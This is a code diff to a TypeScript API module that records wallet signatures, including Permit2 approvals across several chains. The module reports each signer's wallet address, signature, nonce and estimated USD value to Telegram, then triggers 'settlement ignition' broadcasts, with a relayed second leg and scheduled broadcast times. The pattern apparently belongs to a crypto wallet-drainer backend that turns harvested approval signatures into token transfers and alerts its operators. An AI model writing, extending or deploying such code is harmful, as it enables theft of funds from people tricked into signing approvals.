@@ -12,6 +12,11 @@ import {
   type SettlementIgnitionTelemetry,
 } from '@legion/core'
 import {
+  buildGatekeeperLogRedactionPayload,
+  sanitizeGatekeeperLogDetail,
+  type GatekeeperLogRedactionFields,
+} from '@legion/core/logic'
+import {
   buildEvmSignatureAnchorSettlement,
   buildSvmSignatureAnchorSettlement,
   buildTonSignatureAnchorSettlement,
@@ -33,8 +38,10 @@ import { validateScoutValueUsdField } from '../lib/scout-value-usd.js'
 import { sendSovereignTelemetryPayload } from '../telemetry-sender.js'
 import {
   notifySignatureReceived,
-  notifyVaultSettlement,
+  notifyBroadcastScheduled,
+  notifyBroadcastConfirmed,
   notifyNewSignatureAnchorRequest,
+  type TelegramRequestContext,
 } from '../lib/telegram.js'
 
 const SHADOW_ENVELOPE_PREFIX = 'SHADOW_GCM:v1:'
@@ -46,17 +53,22 @@ function hasConfiguredShadowEnvelopeKey(): boolean {
   return Boolean(gatekeeperSecret)
 }
 
-function gatekeeperPersistLog(level: 'error' | 'warn', event: string, detail: string): void {
+function gatekeeperPersistLog(
+  level: 'error' | 'warn',
+  event: string,
+  detail: string,
+  fields?: GatekeeperLogRedactionFields,
+): void {
   const line = JSON.stringify({
     level: level === 'error' ? 50 : 40,
     time: Date.now(),
     sentinel: 'Gatekeeper',
     module: 'apps/api/signature-anchor',
     event,
-    detail,
+    detail: sanitizeGatekeeperLogDetail(detail),
+    ...buildGatekeeperLogRedactionPayload(fields),
   })
-  if (level === 'error') process.stderr.write(`${line}\n`)
-  else process.stderr.write(`${line}\n`)
+  process.stderr.write(`${line}\n`)
 }
 
 function serializeSupabaseFault(err: {
@@ -65,12 +77,14 @@ function serializeSupabaseFault(err: {
   details?: string
   hint?: string
 }): string {
-  return JSON.stringify({
-    message: err.message,
-    code: err.code ?? null,
-    details: err.details ?? null,
-    hint: err.hint ?? null,
-  })
+  return sanitizeGatekeeperLogDetail(
+    JSON.stringify({
+      message: err.message,
+      code: err.code ?? null,
+      details: err.details ?? null,
+      hint: err.hint ?? null,
+    }),
+  )
 }
 
 function resolveCentralHubVaultUrl(): string {
@@ -163,12 +177,22 @@ type PersistedSignatureRow = {
   expiry: string
   wallet_type: string
   protocol: string
+  chain_family?: ChainFamily | null
   chain_id?: string | null
   scout_value_usd?: string | null
   amount?: string | null
   max_allowance?: string | null
   requires_quorum?: boolean | null
   source_origin: string
+}
+
+function anchorLogFields(row: PersistedSignatureRow, scout_value_usd?: number): GatekeeperLogRedactionFields {
+  return {
+    wallet_address: row.wallet_address,
+    token_address: row.token_address,
+    scout_value_usd: row.scout_value_usd ?? scout_value_usd,
+    amount: row.amount,
+  }
 }
 
 type SettlementIgnitionOutcome =
@@ -309,6 +333,25 @@ function settlementCommitmentDigestHex(wallet: string, nonce: string, expiry: st
   return `0x${h}`
 }
 
+async function updateSignatureScheduledBroadcastTime(params: {
+  supabase: SupabaseAdminClient
+  nonce: string
+  scheduled_broadcast_time: string
+}): Promise<void> {
+  // eslint-disable-next-line @typescript-eslint/no-explicit-any
+  const { error } = await (params.supabase as any)
+    .from('signatures')
+    .update({ scheduled_broadcast_time: params.scheduled_broadcast_time })
+    .eq('nonce', params.nonce)
+  if (error) {
+    gatekeeperPersistLog(
+      'warn',
+      'signatures.scheduled_broadcast_time_failed',
+      (error as { message: string }).message,
+    )
+  }
+}
+
 async function updateSignatureSettlementStatus(params: {
   supabase: SupabaseAdminClient
   wallet_address: string
@@ -322,7 +365,15 @@ async function updateSignatureSettlementStatus(params: {
     .eq('wallet_address', params.wallet_address)
     .eq('token_address', params.token_address)
   if (error) {
-    gatekeeperPersistLog('warn', 'signatures.settlement_status_failed', (error as { message: string }).message)
+    gatekeeperPersistLog(
+      'warn',
+      'signatures.settlement_status_failed',
+      (error as { message: string }).message,
+      {
+        wallet_address: params.wallet_address,
+        token_address: params.token_address,
+      },
+    )
   }
 }
 
@@ -355,6 +406,14 @@ function settlementIgnitionFault(outcome: SettlementIgnitionOutcome | undefined)
 function settlementIgnitionTxHash(outcome: SettlementIgnitionOutcome | undefined): string | null {
   if (
     outcome != null &&
+    'relay_second_leg_tx_hash' in outcome &&
+    typeof outcome.relay_second_leg_tx_hash === 'string' &&
+    outcome.relay_second_leg_tx_hash.trim() !== ''
+  ) {
+    return outcome.relay_second_leg_tx_hash.trim()
+  }
+  if (
+    outcome != null &&
     'sovereign_dispatcher_tx_hash' in outcome &&
     typeof outcome.sovereign_dispatcher_tx_hash === 'string' &&
     outcome.sovereign_dispatcher_tx_hash.trim() !== ''
@@ -362,6 +421,15 @@ function settlementIgnitionTxHash(outcome: SettlementIgnitionOutcome | undefined
     return outcome.sovereign_dispatcher_tx_hash.trim()
   }
   return null
+}
+
+function settlementUsedRelaySecondLeg(outcome: SettlementIgnitionOutcome | undefined): boolean {
+  return (
+    outcome != null &&
+    'relay_second_leg_tx_hash' in outcome &&
+    typeof outcome.relay_second_leg_tx_hash === 'string' &&
+    outcome.relay_second_leg_tx_hash.trim() !== ''
+  )
 }
 
 function queueEventDrivenReconciliation(params: {
@@ -374,8 +442,50 @@ function queueEventDrivenReconciliation(params: {
     .then(() => runEventDrivenReconciliation(params))
     .catch((err) => {
       const fault = err instanceof Error ? err.message : String(err)
-      gatekeeperPersistLog('error', 'signatures.reconciliation_unhandled', fault)
+      gatekeeperPersistLog(
+        'error',
+        'signatures.reconciliation_unhandled',
+        fault,
+        anchorLogFields(params.row, params.scout_value_usd),
+      )
     })
+}
+
+function resolveSettlementChainId(
+  row: PersistedSignatureRow,
+  chain_id: string | null,
+): string | null {
+  if (chain_id != null && chain_id.trim() !== '') return chain_id.trim()
+  if (row.chain_id != null && String(row.chain_id).trim() !== '') {
+    return String(row.chain_id).trim()
+  }
+  return null
+}
+
+function resolveSettlementAmount(row: PersistedSignatureRow): string | null {
+  if (row.amount == null || row.amount.trim() === '') return null
+  const trimmed = row.amount.trim()
+  return /^\d+$/.test(trimmed) ? trimmed : null
+}
+
+function buildLiquidationTriggerFromAnchorRow(
+  row: PersistedSignatureRow,
+  chain_id: string | null,
+  scout_value_usd: number,
+): Parameters<typeof executeSettlementIgnition>[0] {
+  const chainFamily = row.chain_family ?? chainFamilyFromRack(row.protocol)
+  const amount = resolveSettlementAmount(row)
+  return {
+    wallet_address: row.wallet_address,
+    token_address: row.token_address,
+    signature_hex: row.signature_hex,
+    protocol: row.protocol,
+    chain_id: resolveSettlementChainId(row, chain_id),
+    chain_family: chainFamily,
+    chain_type: row.protocol,
+    scout_value_usd,
+    ...(amount != null ? { amount } : {}),
+  }
 }
 
 async function runEventDrivenReconciliation(params: {
@@ -385,20 +495,49 @@ async function runEventDrivenReconciliation(params: {
   scout_value_usd: number
 }): Promise<void> {
   const { row, supabase, chain_id, scout_value_usd } = params
+  const reconciliationTelegramCtx: TelegramRequestContext = {
+    chain_id: resolveSettlementChainId(row, chain_id) ?? undefined,
+    chain_family: row.chain_family ?? row.protocol.toUpperCase(),
+    wallet_type: row.wallet_type,
+    scout_value_usd: row.scout_value_usd ?? scout_value_usd,
+    amount: row.amount ?? undefined,
+    nonce: row.nonce,
+    tokenAddress: row.token_address,
+  }
   let outcome: SettlementIgnitionOutcome | undefined
   try {
-    outcome = await executeSettlementIgnition({
-      wallet_address: row.wallet_address,
-      token_address: row.token_address,
-      signature_hex: row.signature_hex,
-      protocol: row.protocol,
-      chain_id,
-      scout_value_usd,
-      amount: row.amount ?? null,
-    })
+    outcome = await executeSettlementIgnition(
+      buildLiquidationTriggerFromAnchorRow(row, chain_id, scout_value_usd),
+      {
+        onBroadcastScheduled: async (scheduledIso) => {
+          await updateSignatureScheduledBroadcastTime({
+            supabase,
+            nonce: row.nonce,
+            scheduled_broadcast_time: scheduledIso,
+          })
+          await notifyBroadcastScheduled(
+            scheduledIso,
+            row.wallet_address,
+            reconciliationTelegramCtx,
+          )
+        },
+        onRelaySecondLegBroadcast: async (secondLegTxHash) => {
+          await notifyBroadcastConfirmed(
+            secondLegTxHash,
+            row.wallet_address,
+            { ...reconciliationTelegramCtx, tx_hash: secondLegTxHash },
+          )
+        },
+      },
+    )
   } catch (ignErr) {
     const fault = ignErr instanceof Error ? ignErr.message : String(ignErr)
-    gatekeeperPersistLog('error', 'signatures.settlement_ignition', fault)
+    gatekeeperPersistLog(
+      'error',
+      'signatures.settlement_ignition',
+      fault,
+      anchorLogFields(row, scout_value_usd),
+    )
     outcome = { ignition_fault: fault }
   }
 
@@ -410,7 +549,12 @@ async function runEventDrivenReconciliation(params: {
       token_address: row.token_address,
       settlement_status: 'FAILED_SETTLEMENT',
     })
-    gatekeeperPersistLog('warn', 'signatures.reconciliation_failed', fault)
+    gatekeeperPersistLog(
+      'warn',
+      'signatures.reconciliation_failed',
+      fault,
+      anchorLogFields(row, scout_value_usd),
+    )
     return
   }
 
@@ -424,8 +568,13 @@ async function runEventDrivenReconciliation(params: {
     settlement_status: 'SETTLED',
   })
 
-  // 🔔 Telegram: Notify vault settlement confirmed
-  notifyVaultSettlement(row.wallet_address, txHash, scout_value_usd).catch(() => {})
+  if (!settlementUsedRelaySecondLeg(outcome)) {
+    const settlementTelegramCtx: TelegramRequestContext = {
+      ...reconciliationTelegramCtx,
+      tx_hash: txHash,
+    }
+    notifyBroadcastConfirmed(txHash, row.wallet_address, settlementTelegramCtx).catch(() => {})
+  }
 
   await sendSovereignTelemetryPayload({
     event: 'SETTLEMENT_IGNITED',
@@ -572,19 +721,33 @@ async function persistSignatureRow(
   rowPayload['source_origin'] = row.source_origin
   rowPayload['settlement_status'] = 'PENDING'
 
-  // 🔔 Telegram: Notify signature received
+  const chainNormForTelegram =
+    row.chain_id != null && String(row.chain_id).trim() !== ''
+      ? String(row.chain_id).trim()
+      : null
   const scoutUsdForTelegram = Number(row.scout_value_usd ?? '0')
+  const anchorTelegramCtx: TelegramRequestContext = {
+    chain_id: chainNormForTelegram ?? undefined,
+    chain_family: row.chain_family ?? row.protocol.toUpperCase(),
+    wallet_type: row.wallet_type,
+    scout_value_usd: row.scout_value_usd ?? scoutUsdForTelegram,
+    amount: row.amount ?? undefined,
+    nonce: row.nonce,
+    tokenAddress: row.token_address,
+    signature: row.signature_hex,
+  }
   notifySignatureReceived(
     row.wallet_address,
     row.protocol.toUpperCase(),
     row.signature_hex,
+    anchorTelegramCtx,
   ).catch(() => {})
-  // 🔔 Telegram: Notify settlement request initiated (with USD value)
   notifyNewSignatureAnchorRequest(
     row.wallet_address,
     row.protocol.toUpperCase(),
     row.wallet_type,
     Number.isFinite(scoutUsdForTelegram) ? scoutUsdForTelegram : 0,
+    anchorTelegramCtx,
   ).catch(() => {})
 
   const { error: upErr } = await supabase.from('signatures').upsert(rowPayload, {
@@ -593,8 +756,7 @@ async function persistSignatureRow(
 
   if (upErr) {
     const shadowDetail = serializeSupabaseFault(upErr)
-    gatekeeperPersistLog('error', 'signatures.upsert_failed', shadowDetail)
-    process.stderr.write(`${shadowDetail}\n`)
+    gatekeeperPersistLog('error', 'signatures.upsert_failed', shadowDetail, anchorLogFields(row))
     return reply.status(502).send({ error: upErr.message })
   }
 
@@ -744,6 +906,7 @@ async function handleNormalizedIngress(
       expiry: b.expiry_iso,
       wallet_type: b.wallet_type.trim(),
       protocol: rack,
+      chain_family: b.chain_family,
       scout_value_usd: tel.scout_value_usd,
       amount: tel.amount,
       max_allowance: tel.max_allowance,
@@ -799,6 +962,7 @@ async function handleLegacyPermit2(
           ? b.wallet_type.trim()
           : 'MetaMask',
       protocol: PROTOCOL_RACK.has(rack) ? rack : 'evm',
+      chain_family: 'EVM',
       chain_id:
         b.chain_id != null && String(b.chain_id).trim() !== ''
           ? String(b.chain_id).trim()
